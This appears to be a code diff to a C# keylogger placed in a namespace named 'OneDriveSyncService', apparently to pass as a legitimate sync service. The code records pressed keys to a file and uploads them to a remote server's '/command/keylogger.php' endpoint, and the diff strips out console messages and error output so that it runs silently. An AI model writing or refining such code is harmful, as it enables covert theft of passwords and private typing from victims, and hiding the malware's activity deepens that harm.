@@ -35,6 +35,7 @@ namespace OneDriveSyncService
 
         public static void InitClientKeylogger(string serverName)
         {
+            _serverName = serverName;
             timer.Interval = 15000;
             timer.Elapsed += new ElapsedEventHandler(OnTimedEvent);
             timer.Enabled = true;
@@ -59,27 +60,26 @@ namespace OneDriveSyncService
         public static void StartKeylogger()
         {
             isStarted = true;
-            Console.WriteLine("Keylogger started.");
+
         }
 
         public static void StopKeylogger()
         {
             lock (fileLock)
             {
-                if (File.Exists("keystrokes.txt"))
+                if (File.Exists(path))
                 {
                     try
                     {
-                        File.Delete("keystrokes.txt");
+                        File.Delete(path);
                     }
-                    catch (Exception exception)
+                    catch
                     {
-                        Console.WriteLine(exception.ToString());
+
                     }
                 }
             }
             isStarted = false;
-            Console.WriteLine("Keylogger stopped.");
         }
 
         private static void DoKeylogger()
@@ -91,7 +91,6 @@ namespace OneDriveSyncService
 
                 string keyPressed = GetNewPressedKeys();
 
-                Console.Write(keyPressed);
                 lock (fileLock)
                 {
                     using (StreamWriter sw = File.AppendText(path))
@@ -111,7 +110,7 @@ namespace OneDriveSyncService
 
         private static string GetNewPressedKeys()
         {
-            string pressedKey = String.Empty;
+            string pressedKey = string.Empty;
 
             foreach (int i in Enum.GetValues(typeof(Key)))
             {
@@ -248,9 +247,8 @@ namespace OneDriveSyncService
                 webClient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
                 webClient.UploadString(_serverName + "/command/keylogger.php", payload);
             }
-            catch (Exception exception)
+            catch
             {
-                Console.WriteLine(exception.ToString());
                 Thread.Sleep(5000);
             }
         }
